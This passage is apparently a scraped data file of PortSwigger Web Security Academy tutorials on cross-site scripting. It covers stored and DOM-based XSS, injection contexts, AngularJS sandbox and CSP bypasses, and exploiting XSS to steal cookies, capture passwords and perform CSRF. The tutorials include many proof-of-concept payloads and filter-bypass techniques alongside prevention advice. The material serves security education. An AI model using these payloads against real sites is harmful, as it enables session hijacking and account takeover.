stuff here... */</script></p>`The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.\n\nLAB\n\nAPPRENTICE [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)\n\nImpact of stored XSS attacks\n----------------------------\n\nIf an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. The attacker can carry out any of the actions that are applicable to the impact of [reflected XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/reflected).\n\nIn terms of exploitability, the key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are self-contained within the application itself. The attacker does not need to find an external way of inducing other users to make a particular request containing their exploit. Rather, the attacker places their exploit into the application itself and simply waits for users to encounter it.\n\nThe self-contained nature of stored cross-site scripting exploits is particularly relevant in situations where an XSS vulnerability only affects users who are currently logged in to the application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is induced to make the attacker's request at a time when they are not logged in will not be compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at the time they encounter the exploit.\n\n#### Read more\n\n*   [Exploiting cross-site scripting vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n\nStored XSS in different contexts\n--------------------------------\n\nThere are many different varieties of stored cross-site scripting. The location of the stored data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.\n\nIn addition, if the application performs any validation or other processing on the data before it is stored, or at the point when the stored data is incorporated into responses, this will generally affect what kind of XSS payload is needed.\n\n#### Read more\n\n*   [Cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n\nHow to find and test for stored XSS vulnerabilities\n---------------------------------------------------\n\nMany stored XSS vulnerabilities can be found using Burp Suite's [web vulnerability scanner](https://portswigger.net/burp/vulnerability-scanner).\n\nTesting for stored XSS vulnerabilities manually can be challenging. You need to test all relevant \"entry points\" via which attacker-controllable data can enter the application's processing, and all \"exit points\" at which that data might appear in the application's responses.\n\nEntry points into the application's processing include:\n\n*   Parameters or other data within the URL query string and message body.\n*   The URL file path.\n*   HTTP request headers that might not be exploitable in relation to [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected).\n*   Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.\n\nThe exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.\n\nThe first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:\n\n*   Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.\n*   Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.\n\nTo comprehensively identify links between entry and exit points would involve testing each permutation separately, submitting a specific value into the entry point, navigating directly to the exit point, and determining whether the value appears there. However, this approach is not practical in an application with more than a few pages.\n\nInstead, a more realistic approach is to work systematically through the data entry points, submitting a specific value into each one, and monitoring the application's responses to detect cases where the submitted value appears. Particular attention can be paid to relevant application functions, such as comments on blog posts. When the submitted value is observed in a response, you need to determine whether the data is indeed being stored across different requests, as opposed to being simply reflected in the immediate response.\n\nWhen you have identified links between entry and exit points in the application's processing, each link needs to be specifically tested to detect if a stored XSS vulnerability is present. This involves determining the context within the response where the stored data appears and testing suitable candidate XSS payloads that are applicable to that context. At this point, the testing methodology is broadly the same as for finding [reflected XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/reflected).\n\n", "category": "XSS"}, {"title": "DOM-based XSS", "content": "### Testing HTML sinks\n\nTo test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's \"View source\" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use `Control+F` (or `Command+F` on MacOS) to search the DOM for your string.\n\nFor each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.\n\nNote that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode `location.search` and `location.hash`, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.\n\n### Testing JavaScript execution sinks\n\nTesting JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.\n\nFor each potential source, such as `location`, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use `Control+Shift+F` (or `Command+Alt+F` on MacOS) to search all the page's JavaScript code for the source.\n\nOnce you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.\n\n### Testing for DOM XSS using DOM Invader\n\nIdentifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.\n\nExploiting DOM XSS with different sources and sinks\n---------------------------------------------------\n\nIn principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the [list](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities) below for details.\n\nThe `document.write` sink works with `script` elements, so you can use a simple payload, such as the one below:\n\n`document.write('... <script>alert(document.domain)</script> ...');`\n\nNote, however, that in some situations the content that is written to `document.write` includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload.\n\nThe `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements. For example:\n\n`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`\n\n### Sources and sinks in third-party dependencies\n\nModern web applications are typically built using a number of third-party libraries and frameworks, which often provide additional functions and capabilities for developers. It's important to remember that some of these are also potential sources and sinks for DOM XSS.\n\n#### DOM XSS in jQuery\n\nIf a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's `href` attribute using data from the URL:\n\n```\n$(function() {\n\t$('#backLink').attr(\"href\",(new URLSearchParams(window.location.search)).get('returnUrl'));\n});\n```\n\nYou can exploit this by modifying the URL so that the `location.search` source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's `href`, clicking on the back link will execute it:\n\n`?returnUrl=javascript:alert(document.domain)`\n\nAnother potential sink to look out for is jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.\n\njQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable `hashchange` event handler, similar to the following:\n\n```\n$(window).on('hashchange', function() {\n\tvar element = $(location.hash);\n\telement[0].scrollIntoView();\n});\n```\n\nAs the `hash` is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (`#`). However, you may still find vulnerable code in the wild.\n\nTo actually exploit this classic vulnerability, you'll need to find a way to trigger a `hashchange` event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an `iframe`:\n\n`<iframe src=\"https://vulnerable-website.com#\" onload=\"this.src+='<img src=1 onerror=alert(1)>'\">`\n\nIn this example, the `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS vector is appended to the hash, causing the `hashchange` event to fire.\n\n#### Note\n\nEven newer versions of jQuery can still be vulnerable via the `$()` selector sink, provided you have full control over its input from a source that doesn't require a `#` prefix.\n\n#### DOM XSS in AngularJS\n\nIf a framework like [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.\n\nDOM XSS combined with reflected and stored data\n-----------------------------------------------\n\nSome pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side.\n\nHowever, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also lead to reflected DOM XSS vulnerabilities.\n\nIn a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.\n\n`eval('var data = \"reflected string\"');`\n\nWebsites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.\n\n`element.innerHTML = comment.author`\n\nWhich sinks can lead to DOM-XSS vulnerabilities?\n------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-XSS vulnerabilities:\n\n```\ndocument.write()\ndocument.writeln()\ndocument.domain\nelement.innerHTML\nelement.outerHTML\nelement.insertAdjacentHTML\nelement.onevent\n```\n\nThe following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:\n\n```\nadd()\nafter()\nappend()\nanimate()\ninsertAfter()\ninsertBefore()\nbefore()\nhtml()\nprepend()\nreplaceAll()\nreplaceWith()\nwrap()\nwrapInner()\nwrapAll()\nhas()\nconstructor()\ninit()\nindex()\njQuery.parseHTML()\n$.parseHTML()\n```\n\nHow to prevent DOM-XSS vulnerabilities\n--------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.\n", "category": "XSS"}, {"title": "XSS contexts", "content": "#### Note\n\nWe have built a comprehensive [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to help testing web applications and filters. You can filter by events and tags and see which vectors require user interaction. The cheat sheet also contains [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) sandbox escapes and many other sections to help with XSS research.\n\nWhen the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.\n\nSome useful ways of executing JavaScript are:\n\n```\n<script>alert(document.domain)</script>\n<img src=1 onerror=alert(1)>\n```\n\nXSS in HTML tag attributes\n--------------------------\n\nWhen the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:\n\n`\"><script>alert(document.domain)</script>`\n\nMore commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:\n\n`\" autofocus onfocus=alert(document.domain) x=\"`\n\nThe above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x=\"` to gracefully repair the following markup.\n\nSometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:\n\n`<a href=\"javascript:alert(document.domain)\">`\n\nYou might encounter websites that encode angle brackets but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. In the next lab you can experiment with access keys and exploit a canonical tag. [You can exploit XSS in hidden input fields using a technique invented by PortSwigger Research](https://portswigger.net/research/xss-in-hidden-input-fields).\n\nXSS into JavaScript\n-------------------\n\nWhen the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.\n\n### Terminating the existing script\n\nIn the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:\n\n```\n<script>\n...\nvar input = 'controllable data here';\n...\n</script>\n```\n\nthen you can use the following payload to break out of the existing JavaScript and execute your own:\n\n`</script><img src=1 onerror=alert(document.domain)>`\n\nThe reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.\n\n### Breaking out of a JavaScript string\n\nIn cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.\n\nSome useful ways of breaking out of a string literal are:\n\n```\n'-alert(document.domain)-'\n';alert(document.domain)//\n```\n\nSome applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.\n\nFor example, suppose that the input:\n\n`';alert(document.domain)//`\n\ngets converted to:\n\n`\\';alert(document.domain)//`\n\nYou can now use the alternative payload:\n\n`\\';alert(document.domain)//`\n\nwhich gets converted to:\n\n`\\\\';alert(document.domain)//`\n\nHere, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.\n\nSome websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.\n\n`onerror=alert;throw 1`\n\nThere are multiple ways of using this technique to call [functions without parentheses](https://portswigger.net/research/xss-without-parentheses-and-semi-colons).\n\nThe next lab demonstrates a website that filters certain characters. You'll have to use similar techniques to those described above in order to solve it.\n\n### Making use of HTML-encoding\n\nWhen the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.\n\nWhen the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.\n\nFor example, if the XSS context is as follows:\n\n`<a href=\"#\" onclick=\"... var input='controllable data here'; ...\">`\n\nand the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:\n\n`&apos;-alert(document.domain)-&apos;`\n\nThe `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.\n\n### XSS in JavaScript template literals\n\nJavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.\n\nFor example, the following script will print a welcome message that includes the user's display name:\n\n``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``\n\nWhen the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:\n\n```\n<script>\n...\nvar input = `controllable data here`;\n...\n</script>\n```\n\nthen you can use the following payload to execute JavaScript without terminating the template literal:\n\n`${alert(document.domain)}`\n\nXSS via client-side template injection\n--------------------------------------\n\nSome websites use a client-side template framework, such as AngularJS, to dynamically render web pages. If they embed user input into these templates in an unsafe manner, an attacker may be able to inject their own malicious template expressions that launch an XSS attack.\n", "category": "XSS"}, {"title": "Client-side template injection", "content": "### Constructing an advanced AngularJS sandbox escape\n\nSo you've learned how a basic sandbox escape works, but you may encounter sites that are more restrictive with which characters they allow. For example, a site may prevent you from using double or single quotes. In this situation, you need to use functions such as `String.fromCharCode()` to generate your characters. Although AngularJS prevents access to the `String` constructor within an expression, you can get round this by using the constructor property of a string instead. This obviously requires a string, so to construct an attack like this, you would need to find a way of creating a string without using single or double quotes.\n\nIn a standard sandbox escape, you would use `$eval()` to execute your JavaScript payload, but in the lab below, the `$eval()` function is undefined. Fortunately, we can use the `orderBy` filter instead. The typical syntax of an `orderBy` filter is as follows:\n\n`[123]|orderBy:'Some string'`\n\nNote that the `|` operator has a different meaning than in JavaScript. Normally, this is a bitwise `OR` operation, but in AngularJS it indicates a filter operation. In the code above, we are sending the array `[123]` on the left to the `orderBy` filter on the right. The colon signifies an argument to send to the filter, which in this case is a string. The `orderBy` filter is normally used to sort an object, but it also accepts an expression, which means we can use it to pass a payload.\n\nYou should now have all the tools you need to tackle the next lab.\n\nHow does an AngularJS CSP bypass work?\n--------------------------------------\n\nContent security policy (CSP) bypasses work in a similar way to standard sandbox escapes, but usually involve some HTML injection. When the CSP mode is active in AngularJS, it parses template expressions differently and avoids using the `Function` constructor. This means the standard sandbox escape described above will no longer work.\n\nDepending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead. When inside an event, AngularJS defines a special `$event` object, which simply references the browser event object. You can use this object to perform a CSP bypass. On Chrome, there is a special property on the `$event/event` object called `path`. This property contains an array of objects that causes the event to be executed. The last property is always the `window` object, which we can use to perform a sandbox escape. By passing this array to the `orderBy` filter, we can enumerate the array and use the last element (the `window` object) to execute a global function, such as `alert()`. The following code demonstrates this:\n\n`<input autofocus ng-focus=\"$event.path|orderBy:'[].constructor.from([1],alert)'\">`\n\nNotice that the `from()` function is used, which allows you to convert an object to an array and call a given function (specified in the second argument) on every element of that array. In this case, we are calling the `alert()` function. We cannot call the function directly because the AngularJS sandbox would parse the code and detect that the `window` object is being used to call a function. Using the `from()` function instead effectively hides the `window` object from the sandbox, allowing us to inject malicious code.\n\nPortSwigger Research [created a CSP bypass using AngularJS in 56 characters using this technique](https://portswigger.net/research/angularjs-csp-bypass-in-56-characters).\n\n### Bypassing a CSP with an AngularJS sandbox escape\n\nThis next lab employs a length restriction, so the above vector will not work. In order to exploit the lab, you need to think of various ways of hiding the `window` object from the AngularJS sandbox. One way of doing this is to use the `array.map()` function as follows:\n\n`[1].map(alert)`\n\n`map()` accepts a function as an argument and will call it for each item in the array. This will bypass the sandbox because the reference to the `alert()` function is being used without explicitly referencing the `window`. To solve the lab, try various ways of executing `alert()` without triggering AngularJS's `window` detection.\n\nHow to prevent client-side template injection vulnerabilities\n-------------------------------------------------------------\n\nTo prevent client-side template injection vulnerabilities, avoid using untrusted user input to generate templates or expressions. If this is not practical, consider filtering out template expression syntax from user input prior to embedding it within client-side templates.\n\nNote that HTML-encoding is not sufficient to prevent client-side template injection attacks, because frameworks perform an HTML-decode of relevant content prior to locating and executing template expressions.\n", "category": "XSS"}, {"title": "Exploiting XSS vulnerabilities", "content": "### Cross-site scripting (XSS)\n\n*   [What is XSS?](https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss)\n*   [How does XSS work?](https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work)\n*   [Impact of an attack](https://portswigger.net/web-security/cross-site-scripting#impact-of-xss-vulnerabilities)\n*   [Proof of concept](https://portswigger.net/web-security/cross-site-scripting#xss-proof-of-concept)\n*   [Testing](https://portswigger.net/web-security/cross-site-scripting#how-to-find-and-test-for-xss-vulnerabilities)\n*    [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/reflected#impact-of-reflected-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts)\n    *   [Testing](https://portswigger.net/web-security/cross-site-scripting/reflected#how-to-find-and-test-for-reflected-xss-vulnerabilities)\n    *   [FAQs](https://portswigger.net/web-security/cross-site-scripting/reflected#common-questions-about-reflected-cross-site-scripting)\n*    [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)\n    *   [Impact](https://portswigger.net/web-security/cross-site-scripting/stored#impact-of-stored-xss-attacks)\n    *   [Contexts](https://portswigger.net/web-security/cross-site-scripting/stored#stored-xss-in-different-contexts)\n    *   [Testing for vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/stored#how-to-find-and-test-for-stored-xss-vulnerabilities)\n*    [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n    *    [Testing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-test-for-dom-based-cross-site-scripting)\n        *   [HTML sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-html-sinks)\n        *   [JavaScript execution sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-javascript-execution-sinks)\n        *   [Using DOM Invader](https://portswigger.net/web-security/cross-site-scripting/dom-based#testing-for-dom-xss-using-dom-invader)\n    *    [Exploiting](https://portswigger.net/web-security/cross-site-scripting/dom-based#exploiting-dom-xss-with-different-sources-and-sinks)\n        *    [In third-party dependencies](https://portswigger.net/web-security/cross-site-scripting/dom-based#sources-and-sinks-in-third-party-dependencies)\n            *   [jQuery](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)\n            *   [AngularJS](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-angularjs)\n        *   [DOM XSS combined with reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Sinks](https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/dom-based#how-to-prevent-dom-xss-vulnerabilities)\n*    [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)\n    *   [Between HTML tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)\n    *   [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)\n    *    [JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)\n        *   [Terminating the existing script](https://portswigger.net/web-security/cross-site-scripting/contexts#terminating-the-existing-script)\n        *   [Breaking out of a string](https://portswigger.net/web-security/cross-site-scripting/contexts#breaking-out-of-a-javascript-string)\n        *   [Using HTML-encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding)\n        *   [Template literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)\n    *    [Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)\n        *   [AngularJS sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#what-is-the-angularjs-sandbox)\n        *    [AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-sandbox-escape-work)\n            *   [Constructing an advanced escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#constructing-an-advanced-angularjs-sandbox-escape)\n        *    [AngularJS CSP bypass](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-does-an-angularjs-csp-bypass-work)\n            *   [Bypassing a CSP with an AngularJS sandbox escape](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#bypassing-a-csp-with-an-angularjs-sandbox-escape)\n        *   [Preventing](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection#how-to-prevent-client-side-template-injection-vulnerabilities)\n*    [Exploiting XSS vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n    *   [To steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-steal-cookies)\n    *   [To capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-capture-passwords)\n    *   [To perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting#exploiting-cross-site-scripting-to-perform-csrf)\n*    [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)\n    *   [Preventing attacks](https://portswigger.net/web-security/cross-site-scripting/dangling-markup#how-to-prevent-dangling-markup-attacks)\n*    [Content security policy (CSP)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)\n    *   [Mitigating XSS attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-xss-attacks-using-csp)\n    *   [Mitigating dangling markup attacks](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#mitigating-dangling-markup-attacks-using-csp)\n    *   [Bypassing CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#bypassing-csp-with-policy-injection)\n    *   [Protecting against clickjacking](https://portswigger.net/web-security/cross-site-scripting/content-security-policy#protecting-against-clickjacking-using-csp)\n*    [Preventing XSS attacks](https://portswigger.net/web-security/cross-site-scripting/preventing)\n    *   [Encode data on output](https://portswigger.net/web-security/cross-site-scripting/preventing#encode-data-on-output)\n    *    [Validate input on arrival](https://portswigger.net/web-security/cross-site-scripting/preventing#validate-input-on-arrival)\n        *   [Whitelisting vs blacklisting](https://portswigger.net/web-security/cross-site-scripting/preventing#whitelisting-vs-blacklisting)\n    *   [Allowing \"safe\" HTML](https://portswigger.net/web-security/cross-site-scripting/preventing#allowing-safe-html)\n    *   [Using a template engine](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-using-a-template-engine)\n    *   [In PHP](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-php)\n    *   [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-client-side-in-javascript)\n    *   [In jQuery](https://portswigger.net/web-security/cross-site-scripting/preventing#how-to-prevent-xss-in-jquery)\n    *   [Using CSP](https://portswigger.net/web-security/cross-site-scripting/preventing#mitigating-xss-using-content-security-policy-csp)\n*   [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)\n*   [View all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)\n*   [Exploiting](https://portswigger.net/web-security/cross-site-scripting/exploiting)\n\nExploiting cross-site scripting vulnerabilities\n===============================================\n\nThe traditional way to prove that you've found a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) vulnerability is to create a popup using the `alert()` function. This isn't because [XSS](https://portswigger.net/web-security/cross-site-scripting) has anything to do with popups; it's simply a way to prove that you can execute arbitrary JavaScript on a given domain. You might notice some people using `alert(document.domain)`. This is a way of making it explicit which domain the JavaScript is executing on.\n\nSometimes you'll want to go further and prove that an XSS vulnerability is a real threat by providing a full exploit. In this section, we'll explore three of the most popular and powerful ways to exploit an XSS vulnerability.\n\nExploiting cross-site scripting to steal cookies\n------------------------------------------------\n\nStealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.\n\nIn practice, this approach has some significant limitations:\n\n*   The victim might not be logged in.\n*   Many applications hide their cookies from JavaScript using the `HttpOnly` flag.\n*   Sessions might be locked to additional factors like the user's IP address.\n*   The session might time out before you're able to hijack it.\n\nLAB\n\nPRACTITIONER [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)\n\nExploiting cross-site scripting to capture passwords\n----------------------------------------------------\n\nThese days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.\n\nThe primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)\n\nLAB\n\nPRACTITIONER [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)\n\nExploiting cross-site scripting to perform CSRF\n-----------------------------------------------\n\nAnything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.\n\nSome websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account.\n\nThis type of exploit is typically referred to as [cross-site request forgery](https://portswigger.net/web-security/csrf) ([CSRF](https://portswigger.net/web-security/csrf)), which is slightly confusing because CSRF can 